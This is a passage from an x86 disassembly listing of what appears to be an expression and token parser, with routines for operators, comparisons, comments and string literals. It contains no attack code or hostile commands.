  40409a:	e8 cc fc ff ff       	call   0x403d6b
  40409f:	89 72 08             	mov    %esi,0x8(%edx)
  4040a2:	89 5a 0c             	mov    %ebx,0xc(%edx)
  4040a5:	3b 35 98 ab 40 00    	cmp    0x40ab98,%esi
  4040ab:	77 10                	ja     0x4040bd
  4040ad:	3b 35 88 ab 40 00    	cmp    0x40ab88,%esi
  4040b3:	72 08                	jb     0x4040bd
  4040b5:	01 de                	add    %ebx,%esi
  4040b7:	89 35 8c ab 40 00    	mov    %esi,0x40ab8c
  4040bd:	81 e5 ff ff ff 00    	and    $0xffffff,%ebp
  4040c3:	89 2a                	mov    %ebp,(%edx)
  4040c5:	83 05 68 aa 40 00 20 	addl   $0x20,0x40aa68
  4040cc:	5e                   	pop    %esi
  4040cd:	5f                   	pop    %edi
  4040ce:	59                   	pop    %ecx
  4040cf:	5b                   	pop    %ebx
  4040d0:	5d                   	pop    %ebp
  4040d1:	81 ca 00 00 00 80    	or     $0x80000000,%edx
  4040d7:	c3                   	ret
  4040d8:	80 0d c5 ab 40 00 08 	orb    $0x8,0x40abc5
  4040df:	8a 1d c0 ab 40 00    	mov    0x40abc0,%bl
  4040e5:	c6 05 c0 ab 40 00 00 	movb   $0x0,0x40abc0
  4040ec:	80 fb 00             	cmp    $0x0,%bl
  4040ef:	74 50                	je     0x404141
  4040f1:	80 fb 2b             	cmp    $0x2b,%bl
  4040f4:	75 0d                	jne    0x404103
  4040f6:	01 c2                	add    %eax,%edx
  4040f8:	71 49                	jno    0x404143
  4040fa:	89 d0                	mov    %edx,%eax
  4040fc:	ba 38 08 00 20       	mov    $0x20000838,%edx
  404101:	eb 44                	jmp    0x404147
  404103:	80 fb 21             	cmp    $0x21,%bl
  404106:	75 04                	jne    0x40410c
  404108:	f7 d0                	not    %eax
  40410a:	eb 22                	jmp    0x40412e
  40410c:	80 fb 2d             	cmp    $0x2d,%bl
  40410f:	75 0d                	jne    0x40411e
  404111:	29 c2                	sub    %eax,%edx
  404113:	73 2e                	jae    0x404143
  404115:	89 d0                	mov    %edx,%eax
  404117:	ba 39 08 00 20       	mov    $0x20000839,%edx
  40411c:	eb 29                	jmp    0x404147
  40411e:	80 fb 7e             	cmp    $0x7e,%bl
  404121:	75 06                	jne    0x404129
  404123:	f7 d0                	not    %eax
  404125:	01 c2                	add    %eax,%edx
  404127:	eb 1a                	jmp    0x404143
  404129:	80 fb 26             	cmp    $0x26,%bl
  40412c:	75 04                	jne    0x404132
  40412e:	21 c2                	and    %eax,%edx
  404130:	eb 11                	jmp    0x404143
  404132:	80 fb 7c             	cmp    $0x7c,%bl
  404135:	74 0a                	je     0x404141
  404137:	80 fb dd             	cmp    $0xdd,%bl
  40413a:	74 05                	je     0x404141
  40413c:	80 fb dd             	cmp    $0xdd,%bl
  40413f:	75 02                	jne    0x404143
  404141:	09 c2                	or     %eax,%edx
  404143:	89 d0                	mov    %edx,%eax
  404145:	f8                   	clc
  404146:	c3                   	ret
  404147:	f9                   	stc
  404148:	c3                   	ret
  404149:	3c 2b                	cmp    $0x2b,%al
  40414b:	74 12                	je     0x40415f
  40414d:	3c 2d                	cmp    $0x2d,%al
  40414f:	74 0e                	je     0x40415f
  404151:	3c 7c                	cmp    $0x7c,%al
  404153:	74 0a                	je     0x40415f
  404155:	3c dd                	cmp    $0xdd,%al
  404157:	74 06                	je     0x40415f
  404159:	3c dd                	cmp    $0xdd,%al
  40415b:	74 02                	je     0x40415f
  40415d:	3c 26                	cmp    $0x26,%al
  40415f:	c3                   	ret
  404160:	8a 07                	mov    (%edi),%al
  404162:	e8 e2 ff ff ff       	call   0x404149
  404167:	75 11                	jne    0x40417a
  404169:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  404170:	47                   	inc    %edi
  404171:	49                   	dec    %ecx
  404172:	74 08                	je     0x40417c
  404174:	e8 90 02 00 00       	call   0x404409
  404179:	c3                   	ret
  40417a:	f8                   	clc
  40417b:	c3                   	ret
  40417c:	f9                   	stc
  40417d:	c3                   	ret
  40417e:	f6 c2 08             	test   $0x8,%dl
  404181:	75 06                	jne    0x404189
  404183:	89 3d 10 ab 40 00    	mov    %edi,0x40ab10
  404189:	8a 07                	mov    (%edi),%al
  40418b:	3c 2c                	cmp    $0x2c,%al
  40418d:	74 18                	je     0x4041a7
  40418f:	f6 c2 08             	test   $0x8,%dl
  404192:	75 17                	jne    0x4041ab
  404194:	3c 2b                	cmp    $0x2b,%al
  404196:	74 0f                	je     0x4041a7
  404198:	3c 2d                	cmp    $0x2d,%al
  40419a:	74 0b                	je     0x4041a7
  40419c:	e8 a8 ff ff ff       	call   0x404149
  4041a1:	b0 00                	mov    $0x0,%al
  4041a3:	75 18                	jne    0x4041bd
  4041a5:	eb 0b                	jmp    0x4041b2
  4041a7:	30 c0                	xor    %al,%al
  4041a9:	eb 12                	jmp    0x4041bd
  4041ab:	e8 99 ff ff ff       	call   0x404149
  4041b0:	75 0d                	jne    0x4041bf
  4041b2:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  4041b9:	47                   	inc    %edi
  4041ba:	49                   	dec    %ecx
  4041bb:	74 02                	je     0x4041bf
  4041bd:	f8                   	clc
  4041be:	c3                   	ret
  4041bf:	f9                   	stc
  4041c0:	c3                   	ret
  4041c1:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  4041c8:	83 f9 02             	cmp    $0x2,%ecx
  4041cb:	72 33                	jb     0x404200
  4041cd:	66 8b 07             	mov    (%edi),%ax
  4041d0:	b3 06                	mov    $0x6,%bl
  4041d2:	66 3d 3e 3d          	cmp    $0x3d3e,%ax
  4041d6:	74 2a                	je     0x404202
  4041d8:	fe cb                	dec    %bl
  4041da:	66 3d 3c 3d          	cmp    $0x3d3c,%ax
  4041de:	74 22                	je     0x404202
  4041e0:	fe cb                	dec    %bl
  4041e2:	66 3d 3d 3d          	cmp    $0x3d3d,%ax
  4041e6:	74 1a                	je     0x404202
  4041e8:	3c 3d                	cmp    $0x3d,%al
  4041ea:	74 1a                	je     0x404206
  4041ec:	fe cb                	dec    %bl
  4041ee:	66 3d 21 3d          	cmp    $0x3d21,%ax
  4041f2:	74 0e                	je     0x404202
  4041f4:	fe cb                	dec    %bl
  4041f6:	3c 3e                	cmp    $0x3e,%al
  4041f8:	74 0c                	je     0x404206
  4041fa:	fe cb                	dec    %bl
  4041fc:	3c 3c                	cmp    $0x3c,%al
  4041fe:	74 06                	je     0x404206
  404200:	f9                   	stc
  404201:	c3                   	ret
  404202:	47                   	inc    %edi
  404203:	49                   	dec    %ecx
  404204:	74 fa                	je     0x404200
  404206:	47                   	inc    %edi
  404207:	49                   	dec    %ecx
  404208:	74 f6                	je     0x404200
  40420a:	c3                   	ret
  40420b:	be f8 aa 40 00       	mov    $0x40aaf8,%esi
  404210:	8b 15 f4 aa 40 00    	mov    0x40aaf4,%edx
  404216:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  40421d:	74 0f                	je     0x40422e
  40421f:	8b 35 88 aa 40 00    	mov    0x40aa88,%esi
  404225:	31 d2                	xor    %edx,%edx
  404227:	66 8b 56 34          	mov    0x34(%esi),%dx
  40422b:	83 c6 38             	add    $0x38,%esi
  40422e:	c3                   	ret
  40422f:	f6 05 c9 ab 40 00 20 	testb  $0x20,0x40abc9
  404236:	75 0c                	jne    0x404244
  404238:	e8 ce ff ff ff       	call   0x40420b
  40423d:	4a                   	dec    %edx
  40423e:	78 04                	js     0x404244
  404240:	0f a3 56 04          	bt     %edx,0x4(%esi)
  404244:	c3                   	ret
  404245:	e8 c1 ff ff ff       	call   0x40420b
  40424a:	4a                   	dec    %edx
  40424b:	78 11                	js     0x40425e
  40424d:	0f a3 56 04          	bt     %edx,0x4(%esi)
  404251:	73 05                	jae    0x404258
  404253:	0f a3 16             	bt     %edx,(%esi)
  404256:	72 03                	jb     0x40425b
  404258:	09 f6                	or     %esi,%esi
  40425a:	c3                   	ret
  40425b:	31 f6                	xor    %esi,%esi
  40425d:	c3                   	ret
  40425e:	ba 2c 08 00 04       	mov    $0x400082c,%edx
  404263:	f9                   	stc
  404264:	c3                   	ret
  404265:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  40426c:	75 18                	jne    0x404286
  40426e:	8b 15 f4 aa 40 00    	mov    0x40aaf4,%edx
  404274:	83 fa 1f             	cmp    $0x1f,%edx
  404277:	74 3a                	je     0x4042b3
  404279:	ff 05 f4 aa 40 00    	incl   0x40aaf4
  40427f:	be f8 aa 40 00       	mov    $0x40aaf8,%esi
  404284:	eb 18                	jmp    0x40429e
  404286:	8b 35 88 aa 40 00    	mov    0x40aa88,%esi
  40428c:	31 d2                	xor    %edx,%edx
  40428e:	66 8b 56 34          	mov    0x34(%esi),%dx
  404292:	83 c6 38             	add    $0x38,%esi
  404295:	83 fa 1f             	cmp    $0x1f,%edx
  404298:	74 19                	je     0x4042b3
  40429a:	66 ff 46 fc          	incw   -0x4(%esi)
  40429e:	89 d3                	mov    %edx,%ebx
  4042a0:	4b                   	dec    %ebx
  4042a1:	78 06                	js     0x4042a9
  4042a3:	0f a3 5e 04          	bt     %ebx,0x4(%esi)
  4042a7:	72 11                	jb     0x4042ba
  4042a9:	0f b3 16             	btr    %edx,(%esi)
  4042ac:	0f b3 56 04          	btr    %edx,0x4(%esi)
  4042b0:	09 f6                	or     %esi,%esi
  4042b2:	c3                   	ret
  4042b3:	ba 28 08 00 00       	mov    $0x828,%edx
  4042b8:	f9                   	stc
  4042b9:	c3                   	ret
  4042ba:	0f ab 56 04          	bts    %edx,0x4(%esi)
  4042be:	0f ab 16             	bts    %edx,(%esi)
  4042c1:	31 db                	xor    %ebx,%ebx
  4042c3:	c3                   	ret
  4042c4:	e8 42 ff ff ff       	call   0x40420b
  4042c9:	4a                   	dec    %edx
  4042ca:	78 30                	js     0x4042fc
  4042cc:	0f a3 16             	bt     %edx,(%esi)
  4042cf:	73 08                	jae    0x4042d9
  4042d1:	0f a3 56 04          	bt     %edx,0x4(%esi)
  4042d5:	73 1f                	jae    0x4042f6
  4042d7:	eb 21                	jmp    0x4042fa
  4042d9:	f6 05 c8 ab 40 00 20 	testb  $0x20,0x40abc8
  4042e0:	75 0d                	jne    0x4042ef
  4042e2:	09 c0                	or     %eax,%eax
  4042e4:	74 0d                	je     0x4042f3
  4042e6:	0f ab 16             	bts    %edx,(%esi)
  4042e9:	0f b3 56 04          	btr    %edx,0x4(%esi)
  4042ed:	eb 0b                	jmp    0x4042fa
  4042ef:	09 c0                	or     %eax,%eax
  4042f1:	74 f3                	je     0x4042e6
  4042f3:	0f b3 16             	btr    %edx,(%esi)
  4042f6:	0f ab 56 04          	bts    %edx,0x4(%esi)
  4042fa:	f8                   	clc
  4042fb:	c3                   	ret
  4042fc:	ba 2c 08 00 04       	mov    $0x400082c,%edx
  404301:	f9                   	stc
  404302:	c3                   	ret
  404303:	f6 05 c8 ab 40 00 04 	testb  $0x4,0x40abc8
  40430a:	74 0c                	je     0x404318
  40430c:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  404313:	e9 dd 00 00 00       	jmp    0x4043f5
  404318:	89 fe                	mov    %edi,%esi
  40431a:	b4 01                	mov    $0x1,%ah
  40431c:	80 25 c8 ab 40 00 3e 	andb   $0x3e,0x40abc8
  404323:	8a 07                	mov    (%edi),%al
  404325:	3c 2b                	cmp    $0x2b,%al
  404327:	74 1c                	je     0x404345
  404329:	3c 2d                	cmp    $0x2d,%al
  40432b:	75 11                	jne    0x40433e
  40432d:	80 cc 80             	or     $0x80,%ah
  404330:	eb 13                	jmp    0x404345
  404332:	80 3f 39             	cmpb   $0x39,(%edi)
  404335:	77 3a                	ja     0x404371
  404337:	80 3f 30             	cmpb   $0x30,(%edi)
  40433a:	73 37                	jae    0x404373
  40433c:	eb 33                	jmp    0x404371
  40433e:	3c 7e                	cmp    $0x7e,%al
  404340:	75 f0                	jne    0x404332
  404342:	80 cc 40             	or     $0x40,%ah
  404345:	e3 24                	jecxz  0x40436b
  404347:	89 fb                	mov    %edi,%ebx
  404349:	47                   	inc    %edi
  40434a:	49                   	dec    %ecx
  40434b:	0f 84 83 00 00 00    	je     0x4043d4
  404351:	e3 18                	jecxz  0x40436b
  404353:	b0 20                	mov    $0x20,%al
  404355:	f3 ae                	repz scas %es:(%edi),%al
  404357:	74 12                	je     0x40436b
  404359:	80 7f ff 09          	cmpb   $0x9,-0x1(%edi)
  40435d:	74 f2                	je     0x404351
  40435f:	4f                   	dec    %edi
  404360:	41                   	inc    %ecx
  404361:	80 3f 39             	cmpb   $0x39,(%edi)
  404364:	77 05                	ja     0x40436b
  404366:	80 3f 30             	cmpb   $0x30,(%edi)
  404369:	73 08                	jae    0x404373
  40436b:	01 f9                	add    %edi,%ecx
  40436d:	29 d9                	sub    %ebx,%ecx
  40436f:	89 df                	mov    %ebx,%edi
  404371:	30 e4                	xor    %ah,%ah
  404373:	89 fe                	mov    %edi,%esi
  404375:	8a 07                	mov    (%edi),%al
  404377:	3c 7c                	cmp    $0x7c,%al
  404379:	74 59                	je     0x4043d4
  40437b:	3c dd                	cmp    $0xdd,%al
  40437d:	74 55                	je     0x4043d4
  40437f:	3c 7f                	cmp    $0x7f,%al
  404381:	77 4d                	ja     0x4043d0
  404383:	3c 7a                	cmp    $0x7a,%al
  404385:	77 4d                	ja     0x4043d4
  404387:	3c 5c                	cmp    $0x5c,%al
  404389:	74 49                	je     0x4043d4
  40438b:	3c 3e                	cmp    $0x3e,%al
  40438d:	77 41                	ja     0x4043d0
  40438f:	3c 3a                	cmp    $0x3a,%al
  404391:	77 41                	ja     0x4043d4
  404393:	3c 2f                	cmp    $0x2f,%al
  404395:	75 11                	jne    0x4043a8
  404397:	83 f9 01             	cmp    $0x1,%ecx
  40439a:	74 34                	je     0x4043d0
  40439c:	80 7f 01 2f          	cmpb   $0x2f,0x1(%edi)
  4043a0:	74 32                	je     0x4043d4
  4043a2:	80 7f 01 2a          	cmpb   $0x2a,0x1(%edi)
  4043a6:	74 2c                	je     0x4043d4
  4043a8:	3c 2e                	cmp    $0x2e,%al
  4043aa:	75 07                	jne    0x4043b3
  4043ac:	e8 c9 ed ff ff       	call   0x40317a
  4043b1:	75 21                	jne    0x4043d4
  4043b3:	3c 2d                	cmp    $0x2d,%al
  4043b5:	77 19                	ja     0x4043d0
  4043b7:	3c 27                	cmp    $0x27,%al
  4043b9:	77 19                	ja     0x4043d4
  4043bb:	3c 20                	cmp    $0x20,%al
  4043bd:	74 15                	je     0x4043d4
  4043bf:	3c 09                	cmp    $0x9,%al
  4043c1:	74 11                	je     0x4043d4
  4043c3:	3c 21                	cmp    $0x21,%al
  4043c5:	74 0d                	je     0x4043d4
  4043c7:	3c 26                	cmp    $0x26,%al
  4043c9:	74 09                	je     0x4043d4
  4043cb:	80 3f 0d             	cmpb   $0xd,(%edi)
  4043ce:	74 04                	je     0x4043d4
  4043d0:	47                   	inc    %edi
  4043d1:	49                   	dec    %ecx
  4043d2:	75 a1                	jne    0x404375
  4043d4:	89 fb                	mov    %edi,%ebx
  4043d6:	29 f3                	sub    %esi,%ebx
  4043d8:	75 09                	jne    0x4043e3
  4043da:	e3 07                	jecxz  0x4043e3
  4043dc:	3c 2c                	cmp    $0x2c,%al
  4043de:	75 f0                	jne    0x4043d0
  4043e0:	47                   	inc    %edi
  4043e1:	43                   	inc    %ebx
  4043e2:	49                   	dec    %ecx
  4043e3:	08 25 c8 ab 40 00    	or     %ah,0x40abc8
  4043e9:	89 1d 18 ab 40 00    	mov    %ebx,0x40ab18
  4043ef:	89 35 14 ab 40 00    	mov    %esi,0x40ab14
  4043f5:	80 3e 2c             	cmpb   $0x2c,(%esi)
  4043f8:	75 07                	jne    0x404401
  4043fa:	ba 64 08 00 04       	mov    $0x4000864,%edx
  4043ff:	f9                   	stc
  404400:	c3                   	ret
  404401:	f6 05 c8 ab 40 00 01 	testb  $0x1,0x40abc8
  404408:	c3                   	ret
  404409:	e3 0d                	jecxz  0x404418
  40440b:	f6 05 c8 ab 40 00 04 	testb  $0x4,0x40abc8
  404412:	0f 85 15 01 00 00    	jne    0x40452d
  404418:	09 c9                	or     %ecx,%ecx
  40441a:	0f 84 a8 00 00 00    	je     0x4044c8
  404420:	b0 20                	mov    $0x20,%al
  404422:	f3 ae                	repz scas %es:(%edi),%al
  404424:	0f 84 9e 00 00 00    	je     0x4044c8
  40442a:	80 7f ff 09          	cmpb   $0x9,-0x1(%edi)
  40442e:	74 e8                	je     0x404418
  404430:	09 c9                	or     %ecx,%ecx
  404432:	75 07                	jne    0x40443b
  404434:	8a 47 ff             	mov    -0x1(%edi),%al
  404437:	b4 20                	mov    $0x20,%ah
  404439:	eb 04                	jmp    0x40443f
  40443b:	66 8b 47 ff          	mov    -0x1(%edi),%ax
  40443f:	3c 0d                	cmp    $0xd,%al
  404441:	75 10                	jne    0x404453
  404443:	f6 05 c9 ab 40 00 01 	testb  $0x1,0x40abc9
  40444a:	75 39                	jne    0x404485
  40444c:	e8 da e7 ff ff       	call   0x402c2b
  404451:	eb c5                	jmp    0x404418
  404453:	3c 20                	cmp    $0x20,%al
  404455:	72 c1                	jb     0x404418
  404457:	3c 28                	cmp    $0x28,%al
  404459:	74 bd                	je     0x404418
  40445b:	3c 29                	cmp    $0x29,%al
  40445d:	74 b9                	je     0x404418
  40445f:	3c 23                	cmp    $0x23,%al
  404461:	75 2e                	jne    0x404491
  404463:	f6 05 c9 ab 40 00 20 	testb  $0x20,0x40abc9
  40446a:	75 25                	jne    0x404491
  40446c:	e8 d5 05 00 00       	call   0x404a46
  404471:	72 16                	jb     0x404489
  404473:	f6 05 c9 ab 40 00 04 	testb  $0x4,0x40abc9
  40447a:	74 9c                	je     0x404418
  40447c:	80 25 c9 ab 40 00 de 	andb   $0xde,0x40abc9
  404483:	f8                   	clc
  404484:	c3                   	ret
  404485:	4f                   	dec    %edi
  404486:	41                   	inc    %ecx
  404487:	eb 4f                	jmp    0x4044d8
  404489:	09 c9                	or     %ecx,%ecx
  40448b:	75 4b                	jne    0x4044d8
  40448d:	41                   	inc    %ecx
  40448e:	4f                   	dec    %edi
  40448f:	eb 47                	jmp    0x4044d8
  404491:	3c 5c                	cmp    $0x5c,%al
  404493:	75 10                	jne    0x4044a5
  404495:	e8 e5 e7 ff ff       	call   0x402c7f
  40449a:	0f 84 78 ff ff ff    	je     0x404418
  4044a0:	e9 7f 00 00 00       	jmp    0x404524
  4044a5:	66 3d 2f 2f          	cmp    $0x2f2f,%ax
  4044a9:	74 10                	je     0x4044bb
  4044ab:	66 3d 2f 2a          	cmp    $0x2a2f,%ax
  4044af:	74 30                	je     0x4044e1
  4044b1:	66 3d 3b 3b          	cmp    $0x3b3b,%ax
  4044b5:	74 2c                	je     0x4044e3
  4044b7:	3c 3b                	cmp    $0x3b,%al
  4044b9:	75 69                	jne    0x404524
  4044bb:	e3 0b                	jecxz  0x4044c8
  4044bd:	b0 0d                	mov    $0xd,%al
  4044bf:	f2 ae                	repnz scas %es:(%edi),%al
  4044c1:	75 05                	jne    0x4044c8
  4044c3:	e9 68 ff ff ff       	jmp    0x404430
  4044c8:	e8 77 e8 ff ff       	call   0x402d44
  4044cd:	0f 85 45 ff ff ff    	jne    0x404418
  4044d3:	ba 60 18 00 00       	mov    $0x1860,%edx
  4044d8:	80 25 c9 ab 40 00 de 	andb   $0xde,0x40abc9
  4044df:	f9                   	stc
  4044e0:	c3                   	ret
  4044e1:	86 e0                	xchg   %ah,%al
  4044e3:	31 d2                	xor    %edx,%edx
  4044e5:	47                   	inc    %edi
  4044e6:	49                   	dec    %ecx
  4044e7:	74 34                	je     0x40451d
  4044e9:	80 3f 0d             	cmpb   $0xd,(%edi)
  4044ec:	75 01                	jne    0x4044ef
  4044ee:	42                   	inc    %edx
  4044ef:	47                   	inc    %edi
  4044f0:	49                   	dec    %ecx
  4044f1:	74 2a                	je     0x40451d
  4044f3:	66 39 47 ff          	cmp    %ax,-0x1(%edi)
  4044f7:	75 f0                	jne    0x4044e9
  4044f9:	47                   	inc    %edi
  4044fa:	49                   	dec    %ecx
  4044fb:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  404502:	74 0e                	je     0x404512
  404504:	a1 88 aa 40 00       	mov    0x40aa88,%eax
  404509:	66 01 50 36          	add    %dx,0x36(%eax)
  40450d:	e9 06 ff ff ff       	jmp    0x404418
  404512:	01 15 0c ab 40 00    	add    %edx,0x40ab0c
  404518:	e9 fb fe ff ff       	jmp    0x404418
  40451d:	ba 24 18 00 00       	mov    $0x1824,%edx
  404522:	eb b4                	jmp    0x4044d8
  404524:	e8 06 fd ff ff       	call   0x40422f
  404529:	72 90                	jb     0x4044bb
  40452b:	4f                   	dec    %edi
  40452c:	41                   	inc    %ecx
  40452d:	80 25 c9 ab 40 00 de 	andb   $0xde,0x40abc9
  404534:	80 3f 22             	cmpb   $0x22,(%edi)
  404537:	74 13                	je     0x40454c
  404539:	83 f9 02             	cmp    $0x2,%ecx
  40453c:	72 21                	jb     0x40455f
  40453e:	66 81 3f 4c 22       	cmpw   $0x224c,(%edi)
  404543:	74 07                	je     0x40454c
  404545:	66 81 3f 6c 22       	cmpw   $0x226c,(%edi)
  40454a:	75 13                	jne    0x40455f
  40454c:	31 c0                	xor    %eax,%eax
  40454e:	ba 4b 08 00 40       	mov    $0x4000084b,%edx
  404553:	89 3d 24 ab 40 00    	mov    %edi,0x40ab24
  404559:	89 0d 28 ab 40 00    	mov    %ecx,0x40ab28
  40455f:	f8                   	clc
  404560:	c3                   	ret
  404561:	f6 05 c8 ab 40 00 04 	testb  $0x4,0x40abc8
  404568:	74 0d                	je     0x404577
  40456a:	80 3e 2c             	cmpb   $0x2c,(%esi)
  40456d:	75 19                	jne    0x404588
  40456f:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  404576:	c3                   	ret
  404577:	e8 8d fe ff ff       	call   0x404409
  40457c:	72 0a                	jb     0x404588
  40457e:	80 3f 2c             	cmpb   $0x2c,(%edi)
  404581:	75 05                	jne    0x404588
  404583:	47                   	inc    %edi
  404584:	49                   	dec    %ecx
  404585:	74 f0                	je     0x404577
  404587:	c3                   	ret
  404588:	ba 65 08 00 04       	mov    $0x4000865,%edx
  40458d:	f9                   	stc
  40458e:	c3                   	ret
  40458f:	56                   	push   %esi
  404590:	e8 2a e7 ff ff       	call   0x402cbf
  404595:	75 55                	jne    0x4045ec
  404597:	be ec ab 40 00       	mov    $0x40abec,%esi
  40459c:	e8 65 3c 00 00       	call   0x408206
  4045a1:	73 4c                	jae    0x4045ef
  4045a3:	b8 64 cb 40 00       	mov    $0x40cb64,%eax
  4045a8:	e8 d1 3b 00 00       	call   0x40817e
  4045ad:	73 40                	jae    0x4045ef
  4045af:	b0 05                	mov    $0x5,%al
  4045b1:	e8 cd 3c 00 00       	call   0x408283
  4045b6:	ba 72 08 00 01       	mov    $0x1000872,%edx
  4045bb:	73 37                	jae    0x4045f4
  4045bd:	ba 61 08 00 01       	mov    $0x1000861,%edx
  4045c2:	e8 aa 3d 00 00       	call   0x408371
  4045c7:	74 2b                	je     0x4045f4
  4045c9:	e8 b5 3d 00 00       	call   0x408383
  4045ce:	74 24                	je     0x4045f4
  4045d0:	e8 c0 3d 00 00       	call   0x408395
  4045d5:	74 1d                	je     0x4045f4
  4045d7:	e8 d5 3d 00 00       	call   0x4083b1
  4045dc:	74 16                	je     0x4045f4
  4045de:	e8 e9 3d 00 00       	call   0x4083cc
  4045e3:	74 0f                	je     0x4045f4
  4045e5:	e8 f7 3d 00 00       	call   0x4083e1
  4045ea:	74 08                	je     0x4045f4
  4045ec:	f8                   	clc
  4045ed:	5e                   	pop    %esi
  4045ee:	c3                   	ret
  4045ef:	ba 71 08 00 01       	mov    $0x1000871,%edx
  4045f4:	5e                   	pop    %esi
  4045f5:	f9                   	stc
  4045f6:	c3                   	ret
  4045f7:	52                   	push   %edx
  4045f8:	e8 0c fe ff ff       	call   0x404409
  4045fd:	72 3c                	jb     0x40463b
  4045ff:	74 3a                	je     0x40463b
  404601:	e8 fd fc ff ff       	call   0x404303
  404606:	72 33                	jb     0x40463b
  404608:	74 09                	je     0x404613
  40460a:	e8 bd f5 ff ff       	call   0x403bcc
  40460f:	73 12                	jae    0x404623
  404611:	eb 25                	jmp    0x404638
  404613:	e8 f0 f4 ff ff       	call   0x403b08
  404618:	72 1a                	jb     0x404634
  40461a:	e8 6f f5 ff ff       	call   0x403b8e
  40461f:	72 d7                	jb     0x4045f8
  404621:	75 15                	jne    0x404638
  404623:	e8 56 f6 ff ff       	call   0x403c7e
  404628:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  40462f:	00 00 00 
  404632:	5a                   	pop    %edx
  404633:	c3                   	ret
  404634:	09 d2                	or     %edx,%edx
  404636:	75 03                	jne    0x40463b
  404638:	5a                   	pop    %edx
  404639:	eb 01                	jmp    0x40463c
  40463b:	58                   	pop    %eax
  40463c:	f9                   	stc
  40463d:	c3                   	ret
  40463e:	53                   	push   %ebx
  40463f:	56                   	push   %esi
  404640:	be ec ab 40 00       	mov    $0x40abec,%esi
  404645:	b8 b4 d7 40 00       	mov    $0x40d7b4,%eax
  40464a:	e8 2f 3b 00 00       	call   0x40817e
  40464f:	5e                   	pop    %esi
  404650:	5b                   	pop    %ebx
  404651:	c3                   	ret
  404652:	89 3d 10 ab 40 00    	mov    %edi,0x40ab10
  404658:	c7 05 60 ab 40 00 00 	movl   $0x0,0x40ab60
  40465f:	00 00 00 
  404662:	c7 05 b4 aa 40 00 00 	movl   $0x0,0x40aab4
  404669:	00 00 00 
  40466c:	80 25 c5 ab 40 00 f7 	andb   $0xf7,0x40abc5
  404673:	c6 05 c0 ab 40 00 00 	movb   $0x0,0x40abc0
  40467a:	e8 8a fd ff ff       	call   0x404409
  40467f:	e3 7e                	jecxz  0x4046ff
  404681:	72 73                	jb     0x4046f6
  404683:	74 38                	je     0x4046bd
  404685:	8a 15 c5 ab 40 00    	mov    0x40abc5,%dl
  40468b:	e8 ee fa ff ff       	call   0x40417e
  404690:	72 6d                	jb     0x4046ff
  404692:	a2 c0 ab 40 00       	mov    %al,0x40abc0
  404697:	e8 6d fd ff ff       	call   0x404409
  40469c:	e3 61                	jecxz  0x4046ff
  40469e:	72 56                	jb     0x4046f6
  4046a0:	74 1b                	je     0x4046bd
  4046a2:	e8 5c fc ff ff       	call   0x404303
  4046a7:	72 4f                	jb     0x4046f8
  4046a9:	0f 85 8d 00 00 00    	jne    0x40473c
  4046af:	e8 db fe ff ff       	call   0x40458f
  4046b4:	73 14                	jae    0x4046ca
  4046b6:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  4046bd:	e9 c4 00 00 00       	jmp    0x404786
  4046c2:	89 3d 10 ab 40 00    	mov    %edi,0x40ab10
  4046c8:	eb cd                	jmp    0x404697
  4046ca:	f6 05 c6 ab 40 00 08 	testb  $0x8,0x40abc6
  4046d1:	74 07                	je     0x4046da
  4046d3:	e8 7d 3c 00 00       	call   0x408355
  4046d8:	74 69                	je     0x404743
  4046da:	e8 5f ff ff ff       	call   0x40463e
  4046df:	73 62                	jae    0x404743
  4046e1:	e8 22 f4 ff ff       	call   0x403b08
  4046e6:	72 19                	jb     0x404701
  4046e8:	e8 a1 f4 ff ff       	call   0x403b8e
  4046ed:	72 d3                	jb     0x4046c2
  4046ef:	74 52                	je     0x404743
  4046f1:	ba 4b 08 00 00       	mov    $0x84b,%edx
  4046f6:	eb 5d                	jmp    0x404755
  4046f8:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  4046ff:	eb 7f                	jmp    0x404780
  404701:	09 d2                	or     %edx,%edx
  404703:	75 50                	jne    0x404755
  404705:	89 1d 60 ab 40 00    	mov    %ebx,0x40ab60
  40470b:	89 35 58 ab 40 00    	mov    %esi,0x40ab58
  404711:	ba 66 08 00 00       	mov    $0x866,%edx
  404716:	f6 05 c6 ab 40 00 20 	testb  $0x20,0x40abc6
  40471d:	74 05                	je     0x404724
  40471f:	ba 92 08 00 00       	mov    $0x892,%edx
  404724:	f6 05 c6 ab 40 00 08 	testb  $0x8,0x40abc6
  40472b:	74 28                	je     0x404755
  40472d:	ba 83 04 00 01       	mov    $0x1000483,%edx
  404732:	e8 bd f7 ff ff       	call   0x403ef4
  404737:	e9 96 00 00 00       	jmp    0x4047d2
  40473c:	e8 8b f4 ff ff       	call   0x403bcc
  404741:	72 c2                	jb     0x404705
  404743:	f6 05 c6 ab 40 00 02 	testb  $0x2,0x40abc6
  40474a:	75 0e                	jne    0x40475a
  40474c:	e8 4e f5 ff ff       	call   0x403c9f
  404751:	72 02                	jb     0x404755
  404753:	eb 0a                	jmp    0x40475f
  404755:	e9 9c 00 00 00       	jmp    0x4047f6
  40475a:	e8 1f f5 ff ff       	call   0x403c7e
  40475f:	8b 15 b4 aa 40 00    	mov    0x40aab4,%edx
  404765:	e8 6e f9 ff ff       	call   0x4040d8
  40476a:	72 e9                	jb     0x404755
  40476c:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  404773:	00 00 00 
  404776:	a3 b4 aa 40 00       	mov    %eax,0x40aab4
  40477b:	e9 f3 fe ff ff       	jmp    0x404673
  404780:	8b 15 cc aa 40 00    	mov    0x40aacc,%edx
  404786:	80 3d c0 ab 40 00 00 	cmpb   $0x0,0x40abc0
  40478d:	75 67                	jne    0x4047f6
  40478f:	f6 05 c5 ab 40 00 08 	testb  $0x8,0x40abc5
  404796:	74 53                	je     0x4047eb
  404798:	a1 b4 aa 40 00       	mov    0x40aab4,%eax
  40479d:	f6 05 c6 ab 40 00 02 	testb  $0x2,0x40abc6
